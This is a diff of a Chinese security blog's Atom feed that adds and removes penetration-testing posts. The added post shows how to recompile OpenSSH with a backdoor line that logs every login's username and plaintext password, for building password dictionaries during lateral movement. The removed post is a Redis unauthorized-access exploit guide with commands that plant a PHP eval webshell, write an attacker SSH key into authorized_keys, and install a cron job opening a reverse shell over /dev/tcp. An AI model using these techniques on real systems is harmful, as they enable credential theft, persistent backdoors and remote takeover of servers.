@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://reboot.cf/"/>
-  <updated>2018-03-07T08:35:05.350Z</updated>
+  <updated>2018-03-12T02:29:59.000Z</updated>
   <id>http://reboot.cf/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>重编译OpebSSH记录登录密码</title>
+    <link href="http://reboot.cf/2018/03/12/%E9%87%8D%E7%BC%96%E8%AF%91OpebSSH%E8%AE%B0%E5%BD%95%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81/"/>
+    <id>http://reboot.cf/2018/03/12/重编译OpebSSH记录登录密码/</id>
+    <published>2018-03-12T02:21:37.000Z</published>
+    <updated>2018-03-12T02:29:59.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>横向渗透的时候，通过重新编译添加后门 的OpenSSH 记录密码，掌握运维密码组成规律，生成字典去撞其他服务器<br><a id="more"></a><br>OpenSSH <a href="https://www.openssh.com/portable.html" target="_blank" rel="noopener">源码下载地址</a></p><p>编辑 auth-passwd.c 文件，在 auth_password 函数中添加：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logit(<span class="string">"username: %s password: %s"</span>, authctxt-&gt;user, password);</span><br></pre></td></tr></table></figure><p>重新编译安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check  --with-md5-passwords --mandir=/usr/share/man</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>查看记录的登录密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/<span class="built_in">log</span>/auth.log</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;横向渗透的时候，通过重新编译添加后门 的OpenSSH 记录密码，掌握运维密码组成规律，生成字典去撞其他服务器&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="Tips" scheme="http://reboot.cf/tags/Tips/"/>
+    
+      <category term="Pentest" scheme="http://reboot.cf/tags/Pentest/"/>
+    
+  </entry>
   
   <entry>
     <title>逆向破解学习</title>
@@ -409,30 +431,6 @@
     
     
       <category term="Linux" scheme="http://reboot.cf/tags/Linux/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Redis未授权访问漏洞</title>
-    <link href="http://reboot.cf/2016/01/22/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://reboot.cf/2016/01/22/Redis未授权访问漏洞/</id>
-    <published>2016-01-22T05:51:04.000Z</published>
-    <updated>2018-01-19T01:56:24.503Z</updated>
-    
-    <content type="html"><![CDATA[<p>Redis是一套开源的使用<code>ANSIC</code>编写、支持网络、可基于内存亦可持久化的日志型、键值存储数据库，并提供多种语言的<code>API</code>。Redis默认情况下会开启6379端口，在未开启认证的情况下，可导致任意用户在可以访问目标服务器的情况下未授权访问Redis<br><a id="more"></a></p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>该漏洞在较早前就已经被发现，而近期研究者给出了更为危险的利用方法。Redis 暴露在公网（即绑定在0.0.0.0:6379，目标IP公网可访问），并且没有开启相关认证和添加相关安全策略情况下可受影响而导致被利用。攻击者可利用Redis的相关方法，将自己的公钥写入目标服务器 <code>/root/.ssh</code>文件夹的<code>authotrized_keys</code>文件中，进而可以直接登录目标服务器。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>向网站目录下写入<code>WebShell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename webshell.php</span><br><span class="line"><span class="built_in">set</span> webshell <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>[passwd]);?&gt;"</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="写公钥"><a href="#写公钥" class="headerlink" title="写公钥"></a>写公钥</h2><p>向用户<code>authorized_keys</code>中写入公匙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ (<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; foo.txt</span><br><span class="line">$ redis-cli -h 192.168.1.1 flushall//慎重！</span><br><span class="line">$ cat foo.txt | redis-cli -h 192.168.1.1 -x <span class="built_in">set</span> crackit</span><br><span class="line">$ redis-cli -h 192.168.1.1</span><br><span class="line">192.168.1.1:6379&gt; config <span class="built_in">set</span> dir /Users/antirez/.ssh/</span><br><span class="line">OK</span><br><span class="line">192.168.1.1:6379&gt; config get dir</span><br><span class="line">1) <span class="string">"dir"</span></span><br><span class="line">2) <span class="string">"/Users/antirez/.ssh"</span></span><br><span class="line">192.168.1.1:6379&gt; config <span class="built_in">set</span> dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line">OK</span><br><span class="line">192.168.1.1:6379&gt; save</span><br></pre></td></tr></table></figure><h2 id="写Linux计划任务"><a href="#写Linux计划任务" class="headerlink" title="写Linux计划任务"></a>写Linux计划任务</h2><p>利用Linux的任务反弹shell，向<code>/var/spool/cron</code>写入计划任务，当Linux开启cron的时候，会定时去执行里面的任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/youip/2333 0&gt;&amp;1\n\n"</span>|redis-cli -h 0.0.0.0 -x <span class="built_in">set</span> 1</span><br><span class="line">or</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n\n*/1 * * * *  echo "</span>&lt;?php phpinofo();?&gt;<span class="string">" &gt;/var/www/html/webshell.php;crontab -r\n\n"</span>|redis-cli -h host -x <span class="built_in">set</span> 1</span><br><span class="line">redis-cli -h IP</span><br><span class="line">0.0.0.0:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron</span><br><span class="line">OK</span><br><span class="line">0.0.0.0:6379&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line">OK</span><br><span class="line">0.0.0.0:6379&gt; save</span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Redis是一套开源的使用&lt;code&gt;ANSIC&lt;/code&gt;编写、支持网络、可基于内存亦可持久化的日志型、键值存储数据库，并提供多种语言的&lt;code&gt;API&lt;/code&gt;。Redis默认情况下会开启6379端口，在未开启认证的情况下，可导致任意用户在可以访问目标服务器的情况下未授权访问Redis&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="Tips" scheme="http://reboot.cf/tags/Tips/"/>
-    
-      <category term="Vulnerability" scheme="http://reboot.cf/tags/Vulnerability/"/>
-    
-      <category term="Redis" scheme="http://reboot.cf/tags/Redis/"/>
     
   </entry>
   
